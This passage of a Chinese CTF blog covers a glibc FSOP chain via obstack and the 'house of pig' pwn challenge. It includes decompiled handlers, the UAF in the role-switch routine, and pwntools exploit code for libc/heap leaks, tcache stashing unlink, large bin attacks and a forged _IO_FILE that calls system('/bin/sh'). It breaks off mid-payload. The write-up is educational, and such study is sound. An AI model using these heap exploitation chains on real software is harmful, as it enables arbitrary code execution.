(file-&gt;next)      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)    __printf_buffer_flush (file-&gt;next);  __printf_buffer_as_file_switch_to_buffer (file);  if (!__printf_buffer_has_failed (file-&gt;next))    return (unsigned char) ch;  else    return EOF;&#125;\n\n这个函数一来就是一个强制类型转化为__printf_buffer_as_file结构体。\nstruct __printf_buffer_as_file&#123;  /* Interface to libio.  */  FILE stream;  const struct _IO_jump_t *vtable;   /* Pointer to the underlying buffer.  */  struct __printf_buffer *next;&#125;;\n\n可以看到这个结构体的前面两个成员其实就相当于_IO_FILE_plus结构体，再在后面跟了一个指针。\n这个函数的目标是执行到__printf_buffer_flush，所以需要通过前面的验证。\nstatic void__printf_buffer_as_file_commit (struct __printf_buffer_as_file *file)&#123;  /* Check that the write pointers in the file stream are consistent     with the next buffer.  */  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);   file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;&#125;static inline void__printf_buffer_putc (struct __printf_buffer *buf, char ch)&#123;  if (buf-&gt;write_ptr != buf-&gt;write_end)      *buf-&gt;write_ptr++ = ch;  else    __printf_buffer_putc_1 (buf, ch);&#125;\n\n这里第一个函数中就是验证了next指针的内容。\nstruct __printf_buffer&#123;  char *write_base;  char *write_ptr;  char *write_end;  uint64_t written;  /* Identifies the flush callback.  */  enum __printf_buffer_mode mode;&#125;;\n\n成功绕过上面的判断之后进入下面这个函数:\nstatic void__printf_buffer_do_flush (struct __printf_buffer *buf)&#123;  switch (buf-&gt;mode)    &#123;    case __printf_buffer_mode_failed:    case __printf_buffer_mode_sprintf:      return;    case __printf_buffer_mode_snprintf:      __printf_buffer_flush_snprintf ((struct __printf_buffer_snprintf *) buf);      return;    case __printf_buffer_mode_sprintf_chk:      __chk_fail ();      break;    case __printf_buffer_mode_to_file:      __printf_buffer_flush_to_file ((struct __printf_buffer_to_file *) buf);      return;    case __printf_buffer_mode_asprintf:      __printf_buffer_flush_asprintf ((struct __printf_buffer_asprintf *) buf);      return;    case __printf_buffer_mode_dprintf:      __printf_buffer_flush_dprintf ((struct __printf_buffer_dprintf *) buf);      return;    case __printf_buffer_mode_strfmon:      __set_errno (E2BIG);      __printf_buffer_mark_failed (buf);      return;    case __printf_buffer_mode_fp:      __printf_buffer_flush_fp ((struct __printf_buffer_fp *) buf);      return;    case __printf_buffer_mode_fp_to_wide:      __printf_buffer_flush_fp_to_wide        ((struct __printf_buffer_fp_to_wide *) buf);      return;    case __printf_buffer_mode_fphex_to_wide:      __printf_buffer_flush_fphex_to_wide        ((struct __printf_buffer_fphex_to_wide *) buf);      return;    case __printf_buffer_mode_obstack:      __printf_buffer_flush_obstack ((struct __printf_buffer_obstack *) buf);      return;    &#125;  __builtin_trap ();&#125;\n\n这里最终目标是__printf_buffer_flush_obstack函数。\nvoid__printf_buffer_flush_obstack (struct __printf_buffer_obstack *buf)&#123;  /* About to switch buffers, so record the bytes written so far.  */  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;  if (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1)    &#123;      /* Errors are reported via a callback mechanism (presumably for\t process termination).  */      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);      buf-&gt;base.write_base = obstack_next_free (buf-&gt;obstack);      buf-&gt;base.write_ptr = buf-&gt;base.write_base;      size_t size = obstack_room (buf-&gt;obstack);      buf-&gt;base.write_end = buf-&gt;base.write_ptr + size;      /* Reserve the space on the obstack size.  */      obstack_blank_fast (buf-&gt;obstack, size);    &#125;  else    &#123;      /* Obtain the extra character.  */      buf-&gt;base.write_base = &amp;buf-&gt;ch;      buf-&gt;base.write_ptr = &amp;buf-&gt;ch;      buf-&gt;base.write_end = &amp;buf-&gt;ch + 1;    &#125;&#125;\n\n这个函数的目标就是obstack_1grow，前面的绕过方式很简单，直接绕过就行。\n# define obstack_1grow(OBSTACK, datum)\t\t\t\t\t      \\  __extension__\t\t\t\t\t\t\t\t      \\    (&#123; struct obstack *__o = (OBSTACK);\t\t\t\t\t      \\       if (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)\t\t\t      \\\t _obstack_newchunk (__o, 1);\t\t\t\t\t      \\       obstack_1grow_fast (__o, datum);\t\t\t\t\t      \\       (void) 0; &#125;)\n\n然后执行这个宏，宏中就有了我们熟悉的_obstack_newchunk函数了。\nvoid_obstack_newchunk (struct obstack *h, int length)&#123;  struct _obstack_chunk *old_chunk = h-&gt;chunk;  struct _obstack_chunk *new_chunk;  long new_size;  long obj_size = h-&gt;next_free - h-&gt;object_base;  long i;  long already;  char *object_base;  /* Compute size for new chunk.  */  new_size = (obj_size + length) + (obj_size &gt;&gt; 3) + h-&gt;alignment_mask + 100;  if (new_size &lt; h-&gt;chunk_size)    new_size = h-&gt;chunk_size;  /* Allocate and initialize the new chunk.  */  new_chunk = CALL_CHUNKFUN (h, new_size);  if (!new_chunk)    (*obstack_alloc_failed_handler)();  h-&gt;chunk = new_chunk;  new_chunk-&gt;prev = old_chunk;  new_chunk-&gt;limit = h-&gt;chunk_limit = (char *) new_chunk + new_size;  /* Compute an aligned object_base in the new chunk */  object_base =    __PTR_ALIGN ((char *) new_chunk, new_chunk-&gt;contents, h-&gt;alignment_mask);  /* Move the existing object to the new chunk.     Word at a time is fast and is safe if the object     is sufficiently aligned.  */  if (h-&gt;alignment_mask + 1 &gt;= DEFAULT_ALIGNMENT)    &#123;      for (i = obj_size / sizeof (COPYING_UNIT) - 1;\t   i &gt;= 0; i--)\t((COPYING_UNIT *) object_base)[i]\t  = ((COPYING_UNIT *) h-&gt;object_base)[i];      /* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,\t but that can cross a page boundary on a machine\t which does not do strict alignment for COPYING_UNITS.  */      already = obj_size / sizeof (COPYING_UNIT) * sizeof (COPYING_UNIT);    &#125;  else    already = 0;  /* Copy remaining bytes one by one.  */  for (i = already; i &lt; obj_size; i++)    object_base[i] = h-&gt;object_base[i];  /* If the object just copied was the only data in OLD_CHUNK,     free that chunk and remove it from the chain.     But not if that chunk might contain an empty object.  */  if (!h-&gt;maybe_empty_object      &amp;&amp; (h-&gt;object_base\t  == __PTR_ALIGN ((char *) old_chunk, old_chunk-&gt;contents,\t\t\t  h-&gt;alignment_mask)))    &#123;      new_chunk-&gt;prev = old_chunk-&gt;prev;      CALL_FREEFUN (h, old_chunk);    &#125;  h-&gt;object_base = object_base;  h-&gt;next_free = h-&gt;object_base + obj_size;  /* The new chunk certainly contains no empty object yet.  */  h-&gt;maybe_empty_object = 0;&#125;\n\n这里又可以看到我们熟悉的宏CALL_CHUNKFUN:\n# define CALL_CHUNKFUN(h, size) \\  (((h)-&gt;use_extra_arg)\t\t\t\t\t\t\t      \\   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))\t\t\t\t      \\   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))\n\n当(h)-&gt;use_extra_arg不为0时即可执行到(h)-&gt;chunkfun。现在就是整条链子的调用了。\n总结这里没有一点一点分析每个if语句应该怎么写，这里直接给出总的就行。\n*(A + 0x20) = 0;*(A + 0x28) = A + 0x119;*(A + 0x30) = A + 0x119;*(A + 0xd8) = _IO_printf_buffer_as_file_jumps;*(A + 0xe0) = A + 0xe8;*(A + 0xe8) = 0;*(A + 0xf0) = 0;*(A + 0xf8) = A + 0x119;*(A + 0x108) = 11;*(A + 0x110) = A + 0x110;*(A + 0x128) = 0;*(A + 0x130) = 0;*(A + 0x148) = &amp;system;*(A + 0x158) = &amp;bin_sh;*(A + 0x160) = 1;\n\n参考链接​    https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486227&amp;idx=1&amp;sn=3ee610ce260b4a381bd0bcf202a34dec&amp;chksm=cf53cba5f82442b3f750ea969f480f9851793006f9223b04db9c5f7ad67c08a9f8db2661bed3&amp;mpshare=1&amp;scene=23&amp;srcid=03222uDWnBlUHhXPTbaEqKrs&amp;sharer_sharetime=1679449533105&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392%23rd\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of pig","url":"/2022/03/01/house-of-pig/","content":"在最近做题的过程中发现自己的逆向能力很是欠缺，在梳理程序的逻辑的时候总是会梳理不清，尤其是程序当中存在复杂的结构体时或则存在cpp代码时，脑子就像有浆糊一样，后续会针对自己的逆向能力下手多练习相关题目。\nida恢复跳表首先看到main函数存在这样一句\n\n看不懂就直接看汇编。\n\n可以看出来其实这里是一个类似与switch的语句。只不过ida没有翻译过来。\n恢复的办法就是在IDA的edit当中的other里用Specify switch idiom\n\n\n\nAddress of Jump table：设置成 jump table 的地址\nNumber of elements：设置为 jump table 中存在的元素总数\nSize of table element：设置为 jump table 中元素的类型\nElement shift amount：这个一般情况下都是零，和跳表计算时的方式有关，比如此题只是单纯的跳表地址加跳表中的元素，那么就不需要移位\nElement base value：设置为计算跳转地址时给跳表元素加的值，比如此题的计算方法为 &amp;unk_69E0 + unk_69E0[i]，那么这里就应该填跳表的地址\nStart of the switch idiom：这个默认就行，就是获取跳表值的语句的地址\nInput register of switch：设置为用于给跳表寻址的寄存器\nFirst(lowest) input value：就是 switch 的最小值了\nDefault jump address：也就是 default 的跳转位置，其实有时候可以不填，但是最好还是填上，这个一般在上方不远处的 cmp 指令附近，特征就是判断了输入，然后跳转到某个地址上，跳转的这个地址就是要填的值了\n\n\n以上是各参数的意义\n\n最终填写的结果是这样。\n\n最终呈现的结果是这样。\n在Glibc2.31下的FSOP在以前纯粹讲解FSOP的时候发现的问题是，在2.29时的_IO_str_overflow函数就没有了用变量当作函数来调用，但是源码中还存在这样一段代码：\nchar *new_buf;char *old_buf = fp-&gt;_IO_buf_base;size_t old_blen = _IO_blen (fp);size_t new_size = 2 * old_blen + 100;if (new_size &lt; old_blen)    return EOF;new_buf = malloc (new_size);if (new_buf == NULL)&#123;    /*\t  __ferror(fp) = 1; */    return EOF;&#125;if (old_buf)&#123;    memcpy (new_buf, old_buf, old_blen);    free (old_buf);    /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */    fp-&gt;_IO_buf_base = NULL;&#125;\n\n当中调用了malloc然后memcpy到堆上，最后free掉，这样对于只存在calloc的程序可以说是毁灭性的打击。具体在题目中演示\n流程分析题目依旧是菜单题，不同的是，题目是存在三个角色，每个角色在创建堆块和修改堆块时都是不一样的。\n在这里先把角色的结构体给大家：\nstruct pig&#123;    chunk_arr[24];    chunk_size[24];    chunk_exist[24];    chunk_freed[24];&#125;\n\n这里是第一个角色Peppa的create\nunsigned __int64 __fastcall create_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  __int64 v3; // rax  __int64 v4; // rax  int i; // [rsp+18h] [rbp-18h]  int j; // [rsp+1Ch] [rbp-14h]  int v8; // [rsp+20h] [rbp-10h]  unsigned __int64 v9; // [rsp+28h] [rbp-8h]  v9 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 19 &amp;&amp; *(a1 + 8LL * i); ++i )    ;  if ( i == 20 )  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Message is full!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  else  &#123;    if ( *(users + 84) &lt;= 143 )      *(users + 84) = 144;    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message size: &quot;);    v8 = input_int();    if ( v8 &gt;= *(users + 84) &amp;&amp; v8 &lt;= 0x430 )    &#123;      *(users + 0x54) = v8;      *(a1 + 8LL * i) = calloc(1uLL, v8);      if ( !*(a1 + 8LL * i) )      &#123;        v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error calloc!&quot;);        std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        exit(-1);      &#125;      *(a1 + 4 * (i + 0x30LL)) = v8;      *(a1 + i + 0x120) = 0;      *(a1 + i + 0x138) = 0;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the Peppa&#x27;s message: &quot;);      for ( j = 0; j &lt; v8 / 48; ++j )        sub_2DBC((*(a1 + 8LL * i) + 48 * j), 16LL);      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;    else    &#123;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error size!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  return __readfsqword(0x28u) ^ v9;&#125;\n\n可以看到上面是让下一次创建的堆块必须大于或则等于上一次创建的，以及在后面的for循环里写入内容中间都会出现两行空白sub_2DBC((*(a1 + 8LL * i) + 48 * j), 16LL);。在第二个角色也就是Mummy，创建堆块的规则是一样的，不过写入内容是sub_2DBC((*(a1 + 8LL * i) + 48 * j + 16LL), 16LL);\n但是第三个角色有所区别：\nunsigned __int64 __fastcall create_3(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  __int64 v3; // rax  __int64 v4; // rax  __int64 v5; // rax  __int64 v6; // rax  int i; // [rsp+10h] [rbp-20h]  int j; // [rsp+14h] [rbp-1Ch]  int v10; // [rsp+18h] [rbp-18h]  _BYTE *v11; // [rsp+20h] [rbp-10h]  unsigned __int64 v12; // [rsp+28h] [rbp-8h]  v12 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 4 &amp;&amp; *(a1 + 8LL * i); ++i )    ;  if ( i == 5 )  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Message is full!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  else  &#123;    if ( *(users + 256) &lt;= 143 )      *(users + 256) = 144;    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message size: &quot;);    v10 = input_int();    if ( v10 &gt; 143 &amp;&amp; v10 &lt;= 0x440 )    &#123;      *(users + 256) = v10;      *(a1 + 8LL * i) = calloc(1uLL, v10);      if ( !*(a1 + 8LL * i) )      &#123;        v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error calloc!&quot;);        std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        exit(-1);      &#125;      *(a1 + 4 * (i + 48LL)) = v10;      *(a1 + i + 288) = 0;      *(a1 + i + 312) = 0;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the Daddy&#x27;s message: &quot;);      for ( j = 0; j &lt; v10 / 48; ++j )        sub_2DBC((*(a1 + 8LL * i) + 48 * j + 32LL), 16LL);      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);      if ( i == 4 )      &#123;        v11 = calloc(1uLL, 0xE8uLL);        v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;01dwang&#x27;s Gift:&quot;);        std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        sub_2D09(v11, 0xE8LL);        v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);        std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);      &#125;    &#125;    else    &#123;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error size!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  return __readfsqword(0x28u) ^ v12;&#125;\n\n可以看到这里虽然是记录了上一个chunk的size但是并没有让后面的chunk的size必须大于等于上一个的。而且这里输入内容是这样的sub_2DBC((*(a1 + 8LL * i) + 48 * j + 32LL), 16LL);\n通过上面可以看到peppa能够创建20个chunk，但是mummy只能创建10个chunk，最后的daddy只能创建5个chunk，并且最后一个chunk还是固定大小但是可以连续的写入内容。另外三个角色创建的最大chunk的size分别为：0x430，0x450，0x440 并且可以看到上面只存在calloc来申请chunk\n三个的show函数都挺类似：\nunsigned __int64 __fastcall show_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  int v4; // [rsp+14h] [rbp-Ch]  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message index: &quot;);  v4 = input_int();  if ( v4 &gt;= 0 &amp;&amp; v4 &lt;= 19 )  &#123;    if ( *(a1 + 8LL * v4) &amp;&amp; *(a1 + 4 * (v4 + 48LL)) &amp;&amp; !*(a1 + v4 + 288) )    &#123;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;The message is: &quot;);      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, *(a1 + 8LL * v4));      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  else  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error index!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  return __readfsqword(0x28u) ^ v5;&#125;\n\n可以看到show函数只是验证了，chunk_arr不为空，chunk_size不为空，并且chunk_exist==0\n再看edit函数：\nunsigned __int64 __fastcall edit_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  int i; // [rsp+18h] [rbp-18h]  int v5; // [rsp+1Ch] [rbp-14h]  int v6; // [rsp+20h] [rbp-10h]  unsigned __int64 v7; // [rsp+28h] [rbp-8h]  v7 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message index: &quot;);  v5 = input_int();  if ( v5 &gt;= 0 &amp;&amp; v5 &lt;= 19 )  &#123;    if ( *(a1 + 8LL * v5) &amp;&amp; *(a1 + 4 * (v5 + 48LL)) &amp;&amp; !*(a1 + v5 + 288) )    &#123;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the Peppa&#x27;s message: &quot;);      v6 = *(a1 + 4 * (v5 + 48LL)) / 48;      for ( i = 0; i &lt; v6 &amp;&amp; !sub_2DBC((*(a1 + 8LL * v5) + 48 * i), 16LL); ++i )        ;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  else  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error index!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  return __readfsqword(0x28u) ^ v7;&#125;\n\n这是peppa的edit函数，这里的输入方式其实和再创建chunk的时候是一样的，并且验证的方式和show函数一样。\n最后就是delete函数：\nunsigned __int64 __fastcall delete_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  int v4; // [rsp+14h] [rbp-Ch]  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message index: &quot;);  v4 = input_int();  if ( v4 &gt;= 0 &amp;&amp; v4 &lt;= 19 )  &#123;    if ( *(a1 + 8LL * v4) &amp;&amp; !*(a1 + v4 + 288) &amp;&amp; !*(a1 + v4 + 312) )    &#123;      free(*(a1 + 8LL * v4));      *(a1 + v4 + 288) = 1;      *(a1 + v4 + 312) = 1;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  else  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error index!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  return __readfsqword(0x28u) ^ v5;&#125;\n\n可以看到这里验证就是chunk_arr不为空，chunk_exist==0，chunk_freed==0，free之后将后面两个置为1。\n在最后的更换身份的时候需要先验证密码：\n__int64 check_pass()&#123;  __int64 v0; // rax  __int64 v2; // rax  __int64 v3; // rax  unsigned int v4; // [rsp+Ch] [rbp-114h]  _DWORD v5[24]; // [rsp+10h] [rbp-110h] BYREF  char s[80]; // [rsp+70h] [rbp-B0h] BYREF  char v7[88]; // [rsp+C0h] [rbp-60h] BYREF  unsigned __int64 v8; // [rsp+118h] [rbp-8h]  v8 = __readfsqword(0x28u);  v0 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(         &amp;std::cout,         &quot;Please enter the identity password of the corresponding user:&quot;);  std::ostream::operator&lt;&lt;(v0, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  memset(s, 0, sizeof(s));  memset(v7, 0, 0x50uLL);  sub_2D09(s, 64LL);  v4 = strlen(s);  if ( !v4 )  &#123;    v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;What&#x27;s this?&quot;);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    exit(-1);  &#125;  ((&amp;sub_13C8 + 1))();  sub_2916(v5, s, v4);  sub_2A8B(v5, v7);  if ( !memcmp(v7, &amp;unk_6906, 0x11uLL) || !memcmp(v7, &amp;unk_6917, 0x11uLL) || !strcmp(v7, &quot;&lt;D&quot;) )  &#123;    if ( s[0] == 0x43 )      return 3LL;    if ( s[0] - 0x41 &lt;= 2 )    &#123;      if ( s[0] == 0x41 )        return 1LL;      if ( s[0] == 0x42 )        return 2LL;    &#125;  &#125;  v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Couldn&#x27;t find this password!&quot;);  std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  return 0LL;&#125;\n\n这里s为我们输入的内容，v7为经过md5加密之后的内容，所以只要满足md5之后以’&lt;D’开头即可进入下面\n&#123;    &quot;Peppa&quot;: &quot;A\\x01\\x95\\xc9\\x1c&quot;,    &quot;Mummy&quot;: &quot;B\\x01\\x87\\xc3\\x19&quot;,    &quot;Daddy&quot;: &quot;C\\x01\\xf7\\x3c\\x32&quot;&#125;\t\n\n根据将角色状态复制给变量的过程可以看出来包括所有角色的结构体其实是：\nstruct all_pig&#123;    Peppa_chunk_arr[24];   size: 0xc0    Peppa_chunk_size[24];  size: 0x60    Peppa_chunk_exist[24]; size: 0x18    Peppa_chunk_freed[24]; size: 0x18    Peppa_last_chunk_size; size: 0x4    padding;               size: 0x4    Mummy_chunk_arr[24];   size: 0xc0    Mummy_chunk_size[24];  size: 0x60    Mummy_chunk_exist[24]; size: 0x18    Mummy_chunk_freed[24]; size: 0x18    Mummy_last_chunk_size; size: 0x4    padding;               size: 0x4    Daddy_chunk_arr[24];   size: 0xc0    Daddy_chunk_size[24];  size: 0x60    Daddy_chunk_exist[24]; size: 0x18    Daddy_chunk_freed[24]; size: 0x18    Daddy_last_chunk_size; size: 0x4    padding;               size: 0x4&#125;\n\n将all_pig的内容给pig的内容的过程是：\nunsigned __int64 __fastcall sub_3BEC(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  memcpy(a1, users, 0xC0uLL);  memcpy((a1 + 0xC0), users + 0xC0, 0x60uLL);  memcpy((a1 + 0x120), users + 0x120, 0x18uLL);  memcpy((a1 + 0x138), users + 0x138, 0x18uLL);  return __readfsqword(0x28u) ^ v2;&#125;\n\n可以看到是将结构体的每一部分都给到了单个pig，但是在切换角色时储存单个pig的函数：\nunsigned __int64 __fastcall sub_3B3E(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  memcpy(users, a1, 0xC0uLL);  memcpy(users + 192, (a1 + 192), 0x60uLL);  memcpy(users + 312, (a1 + 312), 0x18uLL);  return __readfsqword(0x28u) ^ v2;&#125;\n\n可以看到这里出现了问题，他并没有将chunk_exist赋值过去，所以就造成了UAF漏洞。\n利用分析利用思路其实就是首先泄漏出libc地址，接着泄漏heap地址，利用tcache stashing unlink attack+和large bin attack实现在free_hook附近分配chunk，但是由于calloc不能够直接申请tcache当中的chunk，所以我们需要第二次利用large bin attack修改掉_IO_list_all，并且这里写入的堆地址必须是第三个用户的堆地址，这里我们再改变_chain到我们最后的gift堆块，最后在gift堆块伪造_IO_FILE结构体。\n泄漏libc地址&amp;heap地址create(0x150, b&#x27;\\n&#x27;*7)  # A0for i in range(7):    create(0x150, b&#x27;\\n&#x27;*7)  # A7    delete(i+1)delete(0)change(2)change(1)show(0)r.recvuntil(b&#x27;The message is: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]edit(1, b&#x27;a&#x27;*7)show(1)r.recvuntil(b&#x27;The message is: aaaaaaa\\n&#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10print(hex(heap_base))\n\n为tcache stashing unlink attack做准备change(2)for i in range(5):    create(0x90, b&#x27;\\n&#x27;*3)  # B4    delete(i)change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A8create(0x150, b&#x27;\\n&#x27;*7)  # A9create(0x150, b&#x27;\\n&#x27;*7)  # A10delete(8)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B5change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A11delete(10)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B6create(0x410, b&#x27;\\n&#x27;*21)  # B7change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A12change(2)create(0x410, b&#x27;\\n&#x27;*22)  # B8change(1)edit(10, b&#x27;a&#x27;*0x40+p64(heap_base+0x12c40) +     p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x20))\n\n第一次large bin attackcreate(0x150, b&#x27;\\n&#x27;*7)  # A13change(2)create(0x420, b&#x27;\\n&#x27;*22)  # B9change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A14change(2)delete(9)change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A15change(2)delete(8)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x28))change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A16change(3)create(0x410, b&#x27;\\n&#x27;*21)  # C0\n\n第二次large bin attackchange(2)edit(9, p64(heap_base+0x13680)*2)edit(8, p64(heap_base+0x13c00)*2)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]-0x20))change(3)delete(0)create(0x430, b&#x27;\\n&#x27;*22)  # C1create(0x440, b&#x27;\\n&#x27;*22)  # C2\n\n修改_chain的指向payload = b&#x27;\\x00&#x27;*0x18+p64(heap_base+0x13c00)payload = payload.ljust(0x158, b&#x27;\\x00&#x27;)create(0x410, payload)  # C3\n\n伪造IO_FILE结构def pack_file(_IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _IO_buf_end=0, vtable=0):    IO_FILE = p64(0)*3+p64(0) + \\        p64(_IO_write_base)+p64(_IO_write_ptr) + \\        p64(0)+p64(_IO_buf_base)+p64(_IO_buf_end)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(0)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEr.recvuntil(b&quot;Gift:&quot;)_IO_str_jumps = libc_base+0x1ed560system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))file_struct = pack_file(1, 0xffffffffffff, heap_base +                        0x13c00+0xe0, heap_base+0x13c00+0xe0+0x18, _IO_str_jumps)file_struct += 